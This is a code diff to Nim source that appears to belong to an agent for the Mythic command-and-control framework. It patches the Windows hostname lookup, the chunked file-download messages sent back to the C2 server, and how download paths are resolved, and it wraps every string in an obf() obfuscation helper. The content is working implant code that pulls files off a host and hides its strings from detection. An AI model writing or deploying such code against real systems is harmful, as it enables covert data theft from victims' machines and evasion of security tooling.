@@ -11,7 +11,10 @@ type
     path: string
 
 proc getHostname(): string =
-  when defined(linux):
+  when defined(windows):
+    # On Windows, COMPUTERNAME is always set and matches what Mythic expects.
+    return getEnv(obf("COMPUTERNAME"), obf("unknown"))
+  elif defined(linux):
     var buffer: array[256, char]
     if gethostname(cast[cstring](addr buffer[0]), 256) == 0:
       return $cast[cstring](addr buffer[0])
@@ -93,14 +96,24 @@ proc processDownloadChunk*(taskId: string, fileId: string, path: string, chunkNu
     
     # Encode to base64
     let chunkData = encode(buffer)
-    
-    let chunkResponse = %*{
-      obf("chunk_num"): chunkNum,
-      obf("file_id"): fileId,
-      obf("chunk_data"): chunkData,
-      obf("chunk_size"): bytesRead
-    }
-    
+
+    # Per Mythic v4 docs: chunk_size is "the normal block size, not necessarily the
+    # final block's length" and only needs to be included on the first chunk. Sending
+    # bytesRead on the final (partial) chunk was wrong and could skew Mythic's offset.
+    let chunkResponse = if chunkNum == 1:
+      %*{
+        obf("chunk_num"): chunkNum,
+        obf("file_id"): fileId,
+        obf("chunk_data"): chunkData,
+        obf("chunk_size"): CHUNK_SIZE
+      }
+    else:
+      %*{
+        obf("chunk_num"): chunkNum,
+        obf("file_id"): fileId,
+        obf("chunk_data"): chunkData
+      }
+
     return %*{
       obf("task_id"): taskId,
       obf("download"): chunkResponse
@@ -116,10 +129,13 @@ proc processDownloadChunk*(taskId: string, fileId: string, path: string, chunkNu
 
 proc completeDownload*(taskId: string, fileId: string, path: string): JsonNode =
   ## Complete the download task
-  
-  let cwd = getCurrentDir()
-  let filePath = cwd / path
-  
+
+  # Preserve absolute / UNC paths; only resolve relative paths against cwd.
+  let filePath = if path.startsWith("\\\\") or isAbsolute(path):
+    path
+  else:
+    getCurrentDir() / path
+
   return %*{
     obf("task_id"): taskId,
     obf("completed"): true,
